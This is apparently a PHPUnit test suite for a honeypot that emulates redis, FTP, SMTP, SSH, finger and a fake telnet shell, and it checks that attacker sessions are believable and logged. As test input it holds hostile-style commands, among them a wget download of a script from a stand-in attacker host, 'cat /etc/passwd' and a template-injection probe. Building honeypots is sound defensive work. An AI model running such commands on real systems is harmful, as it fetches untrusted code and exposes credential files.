<?php

declare(strict_types=1);

namespace Funnypot\Tests;

use Funnypot\Protocol\ProtocolEmulator;
use Funnypot\Protocol\ProtocolSession;
use Funnypot\Protocol\ProtocolTemplateSet;
use Funnypot\Protocol\RespCodec;
use PHPUnit\Framework\TestCase;

final class ProtocolEngineTest extends TestCase
{
    private function emu(string $id): ProtocolEmulator
    {
        $set = ProtocolTemplateSet::fromFile(__DIR__ . '/../resources/compiled/funnypot-protocols.php');
        $e = $set->emulator($id);
        self::assertNotNull($e, "protocol {$id} not compiled");

        return $e;
    }

    private function emuSeeded(string $id, int $seed): ProtocolEmulator
    {
        $set = ProtocolTemplateSet::fromFile(__DIR__ . '/../resources/compiled/funnypot-protocols.php', $seed);
        $e = $set->emulator($id);
        self::assertNotNull($e, "protocol {$id} not compiled");

        return $e;
    }

    public function test_finger_names_the_seeded_host_not_web01(): void
    {
        // finger's Node column must be the SAME host the telnet/ssh shell presents on this box, injected
        // at serve time — a hardcoded web01 is a cross-protocol tell against the seeded hostname.
        $seed = 4242;
        $hostname = \Funnypot\Shell\Host\HostIdentity::fromSeed($seed)->hostname();

        $finger = $this->emuSeeded('finger', $seed);
        $list = $finger->feed("\r\n", new ProtocolSession(9));
        self::assertStringContainsString($hostname, $list, 'finger list names the seeded host');
        self::assertStringNotContainsString('web01', $list);
        self::assertStringContainsString($hostname, $finger->feed("bob\r\n", new ProtocolSession(1)), 'finger no-such-user names the host too');
        self::assertStringNotContainsString('%%HOST%%', $list, 'host placeholder must be substituted');
        // A short host still leaves the columns separated (no merge into the User column).
        self::assertStringNotContainsString($hostname . 'root', $list);
    }

    // --- redis (RESP codec, pure data) ---

    public function test_redis_ping_and_auth_accept_all(): void
    {
        $e = $this->emu('redis');
        $s = new ProtocolSession(7);
        self::assertSame('', $e->banner($s));                    // silent on connect
        self::assertSame("+PONG\r\n", $e->feed("PING\r\n", $s));
        // AUTH as a RESP array is accepted (any password).
        self::assertSame("+OK\r\n", $e->feed("*2\r\n\$4\r\nAUTH\r\n\$3\r\nfoo\r\n", $s));
    }

    public function test_redis_info_is_believable_and_seeded(): void
    {
        $e = $this->emu('redis');
        $a = $e->feed("INFO\r\n", new ProtocolSession(1));
        $b = $e->feed("INFO\r\n", new ProtocolSession(1));
        $c = $e->feed("INFO\r\n", new ProtocolSession(2));
        self::assertStringContainsString('redis_version:7.2.4', $a);
        self::assertMatchesRegularExpression('/run_id:[0-9a-f]{40}/', $a);
        self::assertSame($a, $b);        // deterministic per attacker seed
        self::assertNotSame($a, $c);     // distinct per attacker
        self::assertStringStartsWith('$', $a); // RESP bulk framing
    }

    public function test_redis_config_get_and_unknown_and_quit(): void
    {
        $e = $this->emu('redis');
        self::assertStringContainsString('/var/lib/redis', $e->feed("CONFIG GET dir\r\n", new ProtocolSession(1)));
        self::assertSame("-ERR unknown command\r\n", $e->feed("FROBNICATE x\r\n", new ProtocolSession(1)));
        $s = new ProtocolSession(1);
        self::assertSame("+OK\r\n", $e->feed("QUIT\r\n", $s));
        self::assertTrue($s->close);
    }

    // --- line protocols ---

    public function test_ftp_banner_and_accept_all_login(): void
    {
        $e = $this->emu('ftp');
        $s = new ProtocolSession(1);
        self::assertStringStartsWith('220 ', $e->banner($s));
        self::assertStringContainsString('331', $e->feed("USER root\r\n", $s));
        self::assertStringContainsString('230 Login successful', $e->feed("PASS anything\r\n", $s));
    }

    public function test_smtp_never_relays_but_answers(): void
    {
        $e = $this->emu('smtp');
        $s = new ProtocolSession(1);
        self::assertStringStartsWith('220 ', $e->banner($s));
        self::assertStringContainsString('250-', $e->feed("EHLO evil.example\r\n", $s));
        self::assertStringContainsString('250', $e->feed("MAIL FROM:<a@b>\r\n", $s));
        self::assertStringStartsWith('221', $e->feed("QUIT\r\n", $s));
        self::assertTrue($s->close);
    }

    public function test_ssh_banner_then_close(): void
    {
        $e = $this->emu('ssh');
        $s = new ProtocolSession(1);
        self::assertStringContainsString('SSH-2.0-OpenSSH', $e->banner($s));
        $e->feed("SSH-2.0-libssh_0.9.6\r\n", $s);  // client banner
        self::assertTrue($s->close);                 // no crypto, no shell — logged + closed
    }

    // --- interactive fake shell (telnet) ---

    public function test_telnet_shell_login_commands_and_logging(): void
    {
        $e = $this->emu('telnet');
        $s = new ProtocolSession(7);
        $log = [];
        $cb = function (string $cmd) use (&$log): void {
            $log[] = $cmd;
        };

        self::assertStringContainsString('login:', $e->banner($s));
        // Interactive: the username is echoed, then the password prompt follows.
        self::assertStringContainsString('Password:', $e->feed("root\r\n", $s, $cb)); // username -> password prompt
        self::assertStringContainsString('Welcome', $e->feed("hunter2\r\n", $s, $cb)); // accept-all login

        self::assertStringContainsString('root', $e->feed("whoami\r\n", $s, $cb));
        self::assertStringContainsString('root:x:0:0', $e->feed("cat /etc/passwd\r\n", $s, $cb));
        $e->feed("cd /etc\r\n", $s, $cb);
        self::assertSame('/etc', $s->cwd);
        self::assertStringContainsString('passwd', $e->feed("ls\r\n", $s, $cb));
        // wget returns canned progress but NEVER fetches the URL.
        self::assertStringContainsString('200 OK', $e->feed("wget http://evil.example/x.sh\r\n", $s, $cb));
        self::assertStringContainsString('command not found', $e->feed("frobnicate\r\n", $s, $cb));
        $e->feed("exit\r\n", $s, $cb);
        self::assertTrue($s->close);

        // The whole session — creds attempted + commands + the wget URL — is captured intel.
        self::assertContains('hunter2', $log);
        self::assertContains('cat /etc/passwd', $log);
        self::assertContains('wget http://evil.example/x.sh', $log);
    }

    public function test_telnet_banner_prompt_uname_and_os_release_are_coherent(): void
    {
        // Regression: the login banner/MOTD must name the SAME host + distro the shell's prompt/uname/
        // os-release do — no mid-session flip (that was a tell before the shell was wired to HostIdentity).
        $e = $this->emu('telnet');
        $s = new ProtocolSession(9);
        $banner = $e->banner($s);
        $e->feed("root\r\n", $s);
        $prompt = $e->feed("pw\r\n", $s);              // accept-all -> MOTD + prompt
        $uname = $e->feed("uname -a\r\n", $s);
        preg_match('/root@([a-z0-9-]+):/', $prompt, $pm);
        $hostname = $pm[1] ?? '';
        preg_match('/PRETTY_NAME="([^"]+)"/', $e->feed("cat /etc/os-release\r\n", $s), $m);
        $distro = $m[1] ?? '';

        self::assertNotSame('', $hostname);
        self::assertNotSame('', $distro);
        // one hostname across banner, prompt and uname nodename
        self::assertStringContainsString($hostname, $banner, 'banner login host == hostname');
        self::assertStringContainsString($hostname, $prompt, 'prompt host == hostname');
        self::assertStringContainsString($hostname, $uname, 'uname nodename == hostname');
        // one distro across banner and MOTD
        self::assertStringContainsString($distro, $banner, 'banner distro == os-release');
        self::assertStringContainsString($distro, $prompt, 'MOTD distro == os-release');
    }

    public function test_telnet_shell_serves_fabricated_content(): void
    {
        // The fake box (now a procedural FakeFilesystem) serves believable, inert, coherent content.
        $e = $this->emu('telnet');
        $s = new ProtocolSession(9);
        $e->banner($s);
        $e->feed("root\r\n", $s);       // username -> password prompt
        $e->feed("hunter2\r\n", $s);    // accept-all login

        // Pinned system files cat cleanly.
        $passwd = $e->feed("cat /etc/passwd\r\n", $s);
        self::assertStringContainsString('root:x:0:0', $passwd);
        self::assertStringContainsString("ID=", $e->feed("cat /etc/os-release\r\n", $s));

        // uname is a real, coherent kernel string; the prompt host matches it.
        $uname = $e->feed("uname -a\r\n", $s);
        self::assertStringContainsString('Linux', $uname);
        self::assertStringContainsString('x86_64', $uname);

        // The home directory lists procedural content, and a missing file fails like real Linux.
        self::assertNotSame('', trim($e->feed("ls -la /root\r\n", $s)));
        self::assertStringContainsString('No such file or directory', $e->feed("cat /root/nope-zzz\r\n", $s));
    }

    public function test_telnet_interactive_char_mode_cr_iac_and_backspace(): void
    {
        // A real telnet client sends keystrokes one at a time, ends a line with a BARE CR (no LF),
        // and interleaves IAC negotiation — the exact case the old line-codec shell never handled.
        $e = $this->emu('telnet');
        $s = new ProtocolSession(3);
        $log = [];
        $cb = function (string $cmd) use (&$log): void {
            $log[] = $cmd;
        };

        // Banner negotiates server-side echo so the client hands us each keystroke.
        self::assertStringContainsString("\xff\xfb\x01", $e->banner($s)); // IAC WILL ECHO

        $e->feed("\xff\xfd\x03", $s, $cb);                     // IAC DO SGA — stripped, not input
        $e->feed("ro", $s, $cb);
        $out = $e->feed("ot\r", $s, $cb);                      // bare CR terminates the line
        self::assertStringContainsString('Password:', $out, 'a bare CR (telnet Enter) must end the line');
        self::assertContains('root', $log, 'username captured clean — no CR/IAC garbage');

        $e->feed("pw\r", $s, $cb);                             // password + CR -> logged in

        // Command typed with a backspace correction: "whox" <BS> "ami" -> "whoami".
        $e->feed("whox", $s, $cb);
        $e->feed("\x7f", $s, $cb);
        $out = $e->feed("ami\r", $s, $cb);
        self::assertContains('whoami', $log, 'backspace-corrected command logged cleanly');
        // Prompt is root@<seeded-hostname>:~# — the host matches uname/hostname (not a hardcoded web01).
        self::assertMatchesRegularExpression('/root@[a-z0-9][a-z0-9-]*:~# /', $out, 'root prompt uses the shell hostname, ~ and #');
    }

    // --- codec framing + bounds + safety ---

    public function test_resp_partial_frame_waits_for_more_bytes(): void
    {
        $e = $this->emu('redis');
        $s = new ProtocolSession(1);
        self::assertSame('', $e->feed("*2\r\n\$4\r\nAUTH\r\n", $s)); // incomplete array — no reply yet
        self::assertSame("+OK\r\n", $e->feed("\$3\r\nfoo\r\n", $s)); // completed on the next chunk
    }

    public function test_resp_codec_rejects_absurd_array_count(): void
    {
        $codec = new RespCodec();
        $buf = "*99999999\r\nrest";
        $reqs = $codec->extract($buf);       // must not allocate 99M args
        self::assertSame([''], $reqs);       // bogus header consumed inert
    }

    public function test_buffer_and_request_caps_close_the_connection(): void
    {
        $e = $this->emu('redis');
        $flood = new ProtocolSession(1);
        $e->feed(str_repeat('A', 70000), $flood);
        self::assertTrue($flood->close);      // buffer cap

        $chatty = new ProtocolSession(1);
        $e->feed(str_repeat("PING\r\n", 600), $chatty);
        self::assertTrue($chatty->close);     // request cap
    }

    public function test_every_command_is_exposed_for_logging(): void
    {
        // The listener logs what attackers send; the emulator emits each decoded command.
        $e = $this->emu('redis');
        $logged = [];
        $e->feed(
            "PING\r\n*3\r\n\$6\r\nCONFIG\r\n\$3\r\nGET\r\n\$3\r\ndir\r\n",
            new ProtocolSession(1),
            function (string $cmd, string $resp) use (&$logged): void {
                $logged[] = $cmd;
            }
        );
        self::assertSame(['PING', 'CONFIG GET dir'], $logged);
    }

    public function test_reflected_directive_never_executes(): void
    {
        // An attacker command carrying a directive is inert — nothing is reflected/executed.
        $e = $this->emu('redis');
        $out = $e->feed("GET {{canned.passwd}}\r\n", new ProtocolSession(1));
        self::assertStringNotContainsString('root:x:0:0', $out);
    }
}
